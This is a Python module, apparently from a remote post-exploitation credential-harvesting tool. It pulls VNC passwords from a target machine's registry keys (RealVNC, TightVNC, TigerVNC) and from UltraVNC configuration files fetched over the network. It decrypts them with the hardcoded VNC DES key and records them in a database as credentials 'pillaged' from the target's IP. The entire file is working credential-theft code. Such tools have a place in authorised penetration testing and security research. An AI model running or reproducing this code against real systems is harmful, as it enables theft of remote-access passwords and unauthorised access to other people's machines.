# Code based on vncpasswd.py by trinitronx
# https://github.com/trinitronx/vncpasswd.py
import binascii
import codecs
import traceback

from . import d3des as d

from lib.toolbox import bcolors


# from lazagne.config.winstructure import *


class Vnc():
    def __init__(self, myregops, myfileops, logger, options, db):
        self.vnckey = [23, 82, 107, 6, 35, 78, 88, 7]
        self.myregops = myregops
        self.myfileops = myfileops
        self.logging = logger
        self.options = options
        self.db = db

    def split_len(self, seq, length):
        return [seq[i:i + length] for i in range(0, len(seq), length)]

    def do_crypt(self, password, decrypt):
        try:
            self.logging.debug(f"[{self.options.target_ip}] decoding VNC 1  {password}")
            passpadd = (password + b'\x00' * 8)[:8]
            strkey = ''.join([chr(x) for x in self.vnckey]).encode()
            self.logging.debug(f"[{self.options.target_ip}] decoding VNC {passpadd} : {strkey}")
            key = d.deskey(strkey, decrypt)
            crypted = d.desfunc(passpadd, key)
            self.logging.debug(f"[{self.options.target_ip}] decoding VNC 2 {crypted}")
            return crypted
        except Exception as ex:
            self.logging.error(
                f"[{self.options.target_ip}] exception in do_crypt")
            self.logging.debug(ex)

    def unhex(self, s):
        try:
            s = codecs.decode(s, 'hex')
        except TypeError as e:
            if e.message == 'Odd-length string':
                self.logging.debug('%s . Chopping last char off... "%s"' % (e.message, s[:-1]))
                s = codecs.decode(s[:-1], 'hex')
            else:
                return False
        return s

    def reverse_vncpassword(self, hash):
        try:
            encpasswd = self.unhex(hash)
            pwd = None
            if encpasswd:
                # If the hex encoded passwd length is longer than 16 hex chars and divisible
                # by 16, then we chop the passwd into blocks of 64 bits (16 hex chars)
                # (1 hex char = 4 binary bits = 1 nibble)
                hexpasswd = codecs.encode(encpasswd, 'hex')
                if len(hexpasswd) > 16 and (len(hexpasswd) % 16) == 0:
                    splitstr = self.split_len(codecs.encode(hash, 'hex'), 16)
                    cryptedblocks = []
                    for sblock in splitstr:
                        cryptedblocks.append(self.do_crypt(codecs.decode(sblock, 'hex'), True))
                        pwd = b''.join(cryptedblocks)
                elif len(hexpasswd) <= 16:
                    pwd = self.do_crypt(encpasswd, True)
                else:
                    pwd = self.do_crypt(encpasswd, True)
        except Exception as ex:
            self.logging.debug(f"Exception reverse_vncpassword {hash} ")
            self.logging.debug(ex)
        return pwd

    def vnc_from_registry(self):
        pfound = []
        vncs = (
            ('RealVNC 4.x', 'HKLM\\SOFTWARE\\Wow6432Node\\RealVNC\\WinVNC4', 'Password'),
            ('RealVNC 3.x', 'HKLM\\SOFTWARE\\RealVNC\\vncserver', 'Password'),
            ('RealVNC 4.x', 'HKLM\\SOFTWARE\\RealVNC\\WinVNC4', 'Password'),
            ('RealVNC 4.x', 'HKCU\\SOFTWARE\\RealVNC\\WinVNC4', 'Password'),
            ('RealVNC 3.x', 'HKCU\\Software\\ORL\\WinVNC3', 'Password'),
            ('TightVNC', 'HKCU\\Software\\TightVNC\\Server', 'Password'),
            ('TightVNC', 'HKCU\\Software\\TightVNC\\Server', 'PasswordViewOnly'),
            ('TightVNC', 'HKLM\\Software\\TightVNC\\Server', 'Password'),
            ('TightVNC ControlPassword', 'HKLM\\Software\\TightVNC\\Server', 'ControlPassword'),
            ('TightVNC', 'HKLM\\Software\\TightVNC\\Server', 'PasswordViewOnly'),
            ('TigerVNC', 'HKLM\\Software\\TigerVNC\\Server', 'Password'),
            ('TigerVNC', 'HKCU\\Software\\TigerVNC\\Server', 'Password'),
            ('TigerVNC', 'HKCU\\Software\\TigerVNC\\WinVNC4', 'Password'),
        )

        for vnc in vncs:
            try:
                reg_key = self.myregops.get_reg_value(vnc[1], vnc[2])
                mytype = reg_key[0]
                myvalue = reg_key[1]
                self.logging.debug(
                    f"[{self.options.target_ip}] Found VNC {vnc[0]} encoded password in reg {vnc[1]} : {myvalue}")
            except Exception:
                self.logging.debug(f'Problems with {vnc[0]}')
                continue

            try:
                enc_pwd = myvalue.rstrip('\x00')
                self.logging.debug(f"[{self.options.target_ip}] Found VNC {vnc[0]} encoded password in reg {enc_pwd}")
                # enc_pwd=myvalue
            except Exception as ex:
                self.logging.debug(f'Problems with decoding: {myvalue} - {binascii.hexlify(myvalue.encode("utf-8"))}')
                self.logging.debug(ex)
                continue

            values = {}
            try:
                password = self.reverse_vncpassword(enc_pwd)
                if password:
                    values['Password'] = password
                    self.logging.info(
                        f"[{self.options.target_ip}] {bcolors.OKGREEN} [VNC] {bcolors.OKBLUE}{mytype} password : {bcolors.WARNING} {password} {bcolors.ENDC}")
            except Exception:
                self.logging.debug(u'Problems with reverse_vncpassword: {reg_key}'.format(reg_key=reg_key))
                continue

            values['Server'] = vnc[0]
            # values['Hash'] = enc_pwd
            pfound.append(values)
            ############PROCESSING DATA
            self.db.add_credz(credz_type='VNC',
                              credz_username=vnc[0],
                              credz_password=password.decode('utf-8'),
                              credz_target=self.options.target_ip,
                              credz_path=vnc[1],
                              pillaged_from_computer_ip=self.options.target_ip,
                              pillaged_from_username='MACHINE$')

        return pfound

    def vnc_from_filesystem(self):
        # os.environ could be used here because paths are identical between users
        pfound = []
        vncs = (
            ('UltraVNC', 'ProgramFiles(x86)' + '\\uvnc bvba\\UltraVNC\\ultravnc.ini', ('passwd', 'passwd2')),
            ('UltraVNC', 'PROGRAMFILES' + '\\uvnc bvba\\UltraVNC\\ultravnc.ini', ('passwd', 'passwd2')),
            ('UltraVNC', 'PROGRAMFILES' + '\\UltraVNC\\ultravnc.ini', ('passwd', 'passwd2')),
            ('UltraVNC', 'ProgramFiles(x86)' + '\\UltraVNC\\ultravnc.ini', ('passwd', 'passwd2')),
            ('UltraVNC', 'Program Files (x86)' + '\\uvnc bvba\\UltraVNC\\ultravnc.ini', ('passwd', 'passwd2')),
            ('UltraVNC', 'PROGRAM FILES' + '\\uvnc bvba\\UltraVNC\\ultravnc.ini', ('passwd', 'passwd2')),
            ('UltraVNC', 'PROGRAM FILES' + '\\UltraVNC\\ultravnc.ini', ('passwd', 'passwd2')),
            ('UltraVNC', 'Program Files (x86)' + '\\UltraVNC\\ultravnc.ini', ('passwd', 'passwd2'))
        )

        for vnc in vncs:
            blacklist = ['.', '..']
            browser_path = vnc[1]
            browser_name = vnc[0]
            self.logging.debug(
                f"[{self.options.target_ip}] [+] Looking for VNC {browser_name} Profile Files in {browser_path}")
            try:
                # Downloading profile file
                localfile = self.myfileops.get_file(browser_path, allow_access_error=False)
                if localfile != None:
                    self.logging.debug(
                        f"[{self.options.target_ip}] [+] Found {bcolors.OKBLUE} VNC {browser_name} config file : {browser_path}{bcolors.ENDC}")
                else:
                    continue
            except Exception as ex:
                self.logging.debug(
                    f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Files from VNC {browser_name} - VNC doesn't exist{bcolors.ENDC}")
                self.logging.debug(ex)
                continue

            strings_to_match = vnc[2]
            for string_to_match in strings_to_match:
                string_to_match += '='
                enc_pwd = ''
                try:
                    with open(localfile, 'r') as file:
                        for line in file:
                            if string_to_match in line:
                                enc_pwd = line.replace(string_to_match, '').replace('\n', '')
                except Exception:
                    self.logging.debug(f'Problems with file: {localfile}')
                    continue
                if len(enc_pwd) > 2:
                    values = {}
                    try:
                        password = self.reverse_vncpassword(enc_pwd)
                        if password:
                            values['Password'] = password
                            self.logging.info(
                                f"[{self.options.target_ip}] {bcolors.OKBLUE} [VNC] {browser_name} password : {bcolors.WARNING} {password} {bcolors.ENDC}")
                    except Exception:
                        self.logging.debug(u'Problems with reverse_vncpassword: {enc_pwd}'.format(enc_pwd=enc_pwd))
                        self.logging.debug(traceback.format_exc())
                        continue

                    values['Server'] = vnc[0]
                    # values['Hash'] = enc_pwd
                    pfound.append(values)
                    ############PROCESSING DATA
                    self.db.add_credz(credz_type='VNC',
                                      credz_username=vnc[0],
                                      credz_password=password.decode('utf-8'),
                                      credz_target='',
                                      credz_path=vnc[1],
                                      pillaged_from_computer_ip=self.options.target_ip,
                                      pillaged_from_username='MACHINE$')

        return pfound

    def vnc_from_process(self):
        # Not yet implemented
        return []

    def run(self):
        return self.vnc_from_filesystem() + self.vnc_from_registry() + self.vnc_from_process()
